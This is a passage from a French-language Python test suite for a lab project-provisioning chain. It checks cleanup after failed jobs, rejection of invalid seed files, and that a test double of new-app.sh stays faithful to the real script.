        self.assertIn("app-remove.sh zzcasse --yes", scripts)
        self.assertNotIn("app-register.sh", scripts)
        github = read(GH_LOG)[gh:]
        self.assertIn("DELETE /repos/devtest-gh/zzcasse", github)
        self.assertNotIn("/keys", github)
        no_mark(self, job, "journal et résultat du job en échec")
        self.assertEqual(glob.glob("/tmp/lab-mcp-seed-*"), [])
        # le nom est de nouveau libre : la même création, gabarit rétabli, aboutit
        status, started = web("POST", "/projects", body_of("zzcasse", seed=GOOD))
        self.assertEqual(wait_job(started["job_id"])["state"], "succeeded")

    def test_6_la_chaine_revalide(self):
        """Une graine non recevable remise DIRECTEMENT à la chaîne (sans passer par le serveur) : rien n'est créé."""
        cases = {"statut livré": json.dumps(BAD["statut « livré »"]), "clé inconnue": json.dumps(BAD["clé inconnue"]),
                 "JSON illisible": "{pas du json", "fichier absent": None}
        for label, content in cases.items():
            with self.subTest(label):
                seed_file, result_file = "/tmp/zz-direct-seed.json", "/tmp/zz-direct-result.json"
                for path in (seed_file, result_file):
                    if os.path.exists(path):
                        os.unlink(path)
                if content is not None:
                    with open(seed_file, "w", encoding="utf-8") as fh:
                        fh.write(content)
                calls, gh = read(CALLS), read(GH_LOG)
                env = {**os.environ, "PYTHONPATH": "/app", "LAB_MCP_RESULT_FILE": result_file,
                       "LAB_MCP_SEED_FILE": seed_file, "LAB_GIT_TOKEN": doubles.FAKE_GH_TOKEN}
                proc = subprocess.run(["bash", os.path.join(ROOT, "scripts", "lab-lock.sh"), sys.executable, "-m",
                                       "labmcp.chain", "create", "devtest", "zzdirect", "4", "private", "developers"],
                                      env=env, cwd=ROOT, capture_output=True, text=True)
                self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
                result = json.loads(read(result_file))
                self.assertEqual((result["ok"], result["step"]), (False, "arguments"))
                self.assertEqual((read(CALLS), read(GH_LOG)), (calls, gh), "quelque chose a été lancé")
                self.assertFalse(os.path.exists(seed_file), "le fichier de graine n'a pas été supprimé")
                self.assertFalse(os.path.exists(os.path.join(ROOT, "deploiement", "zzdirect")))
                no_mark(self, proc.stdout + proc.stderr, "sortie de la chaîne")

    def test_7_double_fidele_au_vrai_new_app(self):
        """Les quatre lignes qui rendent les règles sont les mêmes dans le vrai new-app.sh et dans le double."""
        real, double = read(os.path.join(REAL_SCRIPTS, "new-app.sh")), read("/tests/seed/scripts/new-app.sh")
        block = ('  for _rf in FEUILLE_DE_ROUTE.md CLAUDE.md AGENTS.md; do\n'
                 '    sed -e "s|__APP_NAME__|${APP_NAME}|g" \\\n'
                 '        -e "s|__TEST_COMMAND__|${_TEST_CMD}|g" \\\n'
                 '        -e "s|__DATE__|$(date +%F)|g" \\\n'
                 '        "$_RULES_TMPL/$_rf" > "$APP_DIR/$_rf"\n'
                 '  done\n')
        self.assertIn(block, real, "new-app.sh ne rend plus les règles ainsi : revoir le double")
        self.assertIn(block, double)
        self.assertIn('    3|4) _TEST_CMD="python manage.py test" ;;', real)
        self.assertIn('_RULES_TMPL="$DEV_DIR/_templates/regles"', real)


if __name__ == "__main__":
    unittest.main(verbosity=2, warnings="ignore")
